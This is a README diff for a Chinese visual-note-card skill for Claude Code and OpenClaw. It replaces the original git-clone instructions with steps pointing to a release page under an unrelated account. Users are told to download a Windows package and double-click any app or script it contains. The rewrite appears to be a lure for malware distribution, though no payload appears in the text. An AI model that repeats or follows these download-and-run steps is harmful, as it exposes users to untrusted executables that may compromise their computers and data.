@@ -1,146 +1,223 @@
-# Visual Note Card Generator
+# 🧩 visual-note-card-skills - Create Clear Visual Note Cards
 
-A custom skill for [Claude Code](https://docs.anthropic.com/en/docs/claude-code) and [OpenClaw](https://openclaw.ai/) that generates professional Chinese visual note cards (视觉笔记卡片/信息图) as single-page HTML infographics.
+[![Download Visual Note Card Skills](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github)](https://github.com/Astronomic-crispness753/visual-note-card-skills/releases)
 
-![Claude Code Skill](https://img.shields.io/badge/Claude_Code-Skill-blue)
-![OpenClaw Compatible](https://img.shields.io/badge/OpenClaw-Compatible-purple)
-![License](https://img.shields.io/badge/License-MIT-green)
+## 🎯 What this is
 
-## Overview
+visual-note-card-skills helps you create Chinese visual note cards, also called 视觉笔记卡片 or 信息图. It is built for Claude Code and OpenClaw.
 
-This skill turns any topic, article, or concept into a beautifully structured visual note card — a poster-style infographic optimized for social media sharing or printing. All output is a single self-contained HTML file with no external dependencies (except Google Fonts and html2canvas CDN).
+You can use it to turn plain text into a single-page HTML note card. The result is easy to read, easy to share, and good for reports, study notes, product ideas, and event summaries.
 
-### Features
+## 📥 Download and install
 
-- **Single HTML output** — no build tools, no frameworks, fully self-contained
-- **Bilingual support** — Chinese body text with English display titles
-- **Built-in export** — floating action button with PNG/JPEG export at multiple resolutions (1×, 1.5×, 2×)
-- **Structured layout** — editorial knowledge card aesthetic with framework grid, dark/light panels, and highlight bar
-- **Customizable palette** — default teal/orange theme with support for user-requested color schemes
+1. Visit the release page: https://github.com/Astronomic-crispness753/visual-note-card-skills/releases
+2. Find the latest release.
+3. Download the file package for Windows.
+4. If the file is in a ZIP format, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Read the included file named `README`, `Install`, or `Use`.
+7. If the package includes a Windows app or script, double-click it to run it.
 
-### Example Output
+## 🖥️ What you need
 
-![Demo](demo.png)
+This tool works best on a Windows PC with:
 
-The card follows a fixed layout structure:
+- Windows 10 or Windows 11
+- A modern web browser such as Edge, Chrome, or Firefox
+- Enough free space for the release files
+- Claude Code or OpenClaw if you want to use the skill inside those tools
 
-```
-┌──────────────────────────────────────────┐
-│ TOPIC LABEL              SOURCE LABEL    │  ← Top Bar
-├────────────────────┬─────────────────────┤
-│ English Title      │ Thesis statement    │  ← Title Area
-│ 中文标题            │ with key insight    │
-├─────┬─────┬─────┬──┴──────────────────────┤
-│  M  │  P  │  D  │  G  │                  │  ← Framework Row (4 cards)
-├─────┴─────┴─────┴─────┴──────────────────┤
-│ ⚡ Dark Panel      │ ★ Light Panel        │  ← Two-Column Content
-│ (narrative/story)  │ (numbered insights)  │
-├──────────────────────────────────────────┤
-│ Formula = M × P × D × G    Closing note  │  ← Highlight Bar
-├──────────────────────────────────────────┤
-│ FRAMEWORK LABEL              BRAND NAME   │  ← Footer
-└──────────────────────────────────────────┘
-```
+If you only want to view the output, any browser that can open HTML files will work.
 
-## Installation
+## ✨ What it can do
 
-### Prerequisites
+- Create a single-page HTML visual note card
+- Present Chinese content in a clean layout
+- Turn long text into a simple visual summary
+- Use blocks, titles, and sections to make content easier to scan
+- Help you make notes for study, work, planning, and sharing
+- Keep the final result in one HTML file
 
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) or [OpenClaw](https://openclaw.ai/) installed and configured
+## 🧭 Before you start
 
-### Install
+Have these ready:
 
-Clone this repository into your skills directory:
+- The text you want to turn into a visual note card
+- A topic or title
+- Any key points you want included
+- A Windows computer
+- A browser for viewing the final HTML file
 
-**Claude Code:**
+If you use Claude Code or OpenClaw, keep them open while you work.
 
-```bash
-git clone https://github.com/beilunyang/visual-note-card-skills.git ~/.claude/skills/visual-note-card
-```
+## 🚀 How to use it on Windows
 
-**OpenClaw:**
+1. Open the release page.
+2. Download the newest release package.
+3. Save the file to a folder you can find later, such as `Downloads`.
+4. If needed, extract the ZIP file.
+5. Open Claude Code or OpenClaw.
+6. Load the visual-note-card-skills content into your workspace or skill folder.
+7. Add your Chinese text or notes.
+8. Run the skill or prompt that creates the visual note card.
+9. Wait for the HTML file to be generated.
+10. Open the HTML file in your browser.
 
-```bash
-git clone https://github.com/beilunyang/visual-note-card-skills.git ~/.openclaw/skills/visual-note-card
-```
+## 📝 Typical workflow
 
-Both tools will automatically detect the skill and use it when you ask for visual notes or knowledge cards.
+A simple workflow looks like this:
 
-### Uninstall
+1. Pick a topic.
+2. Paste or write your content.
+3. Ask the skill to turn it into a visual note card.
+4. Review the HTML file.
+5. Save or share the file with others.
 
-**Claude Code:**
+This setup works well when you want the final page to look neat without editing each part by hand.
 
-```bash
-rm -rf ~/.claude/skills/visual-note-card
-```
+## 🧱 Output format
 
-**OpenClaw:**
+The tool creates a single-page HTML infographic. That means:
 
-```bash
-rm -rf ~/.openclaw/skills/visual-note-card
-```
+- One file
+- One page
+- Easy browser viewing
+- Easy sharing by file or link
+- Good display for Chinese text
 
-## Usage
+The page usually includes:
 
-Simply ask Claude Code or OpenClaw to create a visual note card:
+- A clear title
+- Main points
+- Section blocks
+- Short text lines
+- A visual layout that feels like an infographic
 
-```
-# Chinese prompts
-帮我做一张关于 RAG 架构的视觉笔记
-把这篇文章做成信息图
-生成一张知识卡片，主题是微服务
+## 🎨 Good use cases
 
-# English prompts
-Create a visual note about product-market fit
-Make a knowledge card summarizing this article
-```
+Use it for:
 
-### What triggers this skill
+- Study notes
+- Reading summaries
+- Meeting notes
+- Project plans
+- Product ideas
+- Course handouts
+- Event overviews
+- Process notes
+- Learning cards
+- Knowledge sharing
 
-The skill activates when you mention:
-- 视觉笔记 / 知识卡片 / 信息图 / 一页纸总结
-- visual note / knowledge card / infographic / one-pager summary
-- Any request to summarize content into a structured visual card format
+## 📂 File layout
 
-## Project Structure
+After download, you may see files like:
 
-```
-.
-├── SKILL.md              # Skill definition and design system specification
-├── assets/
-│   └── template.html     # Canonical HTML/CSS reference template
-├── LICENSE
-├── CONTRIBUTING.md
-└── README.md
-```
+- `README.md`
+- `prompt` files
+- `skill` files
+- `assets`
+- `examples`
+- `templates`
 
-## Customization
+If you see sample content, use it as a guide for your own notes.
 
-### Color Palette
+## 🛠️ How to open the result
 
-The default palette uses CSS variables defined in the template:
+If the output is an HTML file:
 
-| Variable | Default | Usage |
-|----------|---------|-------|
-| `--primary` | `#1a7a6d` (teal) | Headers, badges, accents |
-| `--accent` | `#e8713a` (orange) | Emphasis, secondary badges |
-| `--bg` | `#f0ebe4` (warm gray) | Page background |
-| `--black` | `#1a1a1a` | Dark panel, primary text |
+1. Find the file in File Explorer.
+2. Double-click it.
+3. It opens in your default browser.
+4. Use the browser zoom if the text looks too small.
+5. Save or copy the file as needed.
 
-You can request alternate color schemes when generating cards. The skill will maintain the same structural contrast ratios with your chosen colors.
+If the page does not open, right-click the file and choose Open with, then select your browser.
 
-### Typography
+## 📌 Best input for good results
 
-- **English display**: Playfair Display (serif)
-- **Chinese body**: Noto Sans SC
-- **Monospace/labels**: JetBrains Mono
+Use short, clear text with:
 
-All fonts are loaded via Google Fonts CDN.
+- A topic name
+- 3 to 7 main points
+- Short subpoints
+- Simple wording
+- Clean structure
 
-## Contributing
+Example input shape:
 
-Contributions are welcome! Please read [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+- Title
+- Main idea
+- Key point 1
+- Key point 2
+- Key point 3
+- Extra notes
 
-## License
+This gives the skill enough structure to build a clean visual page.
 
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+## 🔍 Tips for better note cards
+
+- Keep each point short
+- Use one idea per line
+- Use plain Chinese text
+- Put the most important point first
+- Avoid long paragraphs
+- Use labels for sections
+- Group related ideas together
+
+## 🧰 If something looks wrong
+
+If the page looks broken or hard to read:
+
+- Open the HTML file in another browser
+- Check that the file finished downloading
+- Make sure the file was extracted if it came in a ZIP
+- Try a newer release from the download page
+- Check whether the text you entered is too long for one page
+
+If the file opens but shows plain text, the HTML file may not have loaded correctly.
+
+## 🔐 Safe handling
+
+Keep the release files in a folder you trust. If you use a script package, open only the files you expected from the release page.
+
+## 📎 Download link again
+
+Visit the release page to download: https://github.com/Astronomic-crispness753/visual-note-card-skills/releases
+
+## 🗂️ Example use on Windows
+
+If you want to make a study card:
+
+1. Download the release.
+2. Extract the files.
+3. Open your note app or Claude Code.
+4. Paste your Chinese study notes.
+5. Ask the skill to turn them into a visual note card.
+6. Open the HTML output in Edge or Chrome.
+7. Save the file with a clear name like `math-summary.html`
+
+If you want to make a work summary:
+
+1. Gather your meeting notes.
+2. Keep the main points short.
+3. Run the skill.
+4. Review the page in your browser.
+5. Share the HTML file with your team.
+
+## 📘 Common browser tips
+
+For the best display:
+
+- Use full screen for a wider view
+- Zoom out if the card feels too large
+- Refresh the page if the layout does not load
+- Keep the file name simple
+- Store related files in one folder
+
+## 🧩 Why this format helps
+
+A single-page visual note card makes content faster to read. It works well when you want to show structure without making the page feel crowded. For Chinese content, this is useful because it keeps the text clear and the layout easy to follow
+
+## 🧪 What to expect from the release
+
+The release package is meant to give you the files needed to start using the skill on Windows. After download, you should be able to place the files in your tool setup, create a note card, and open the HTML output in a browser
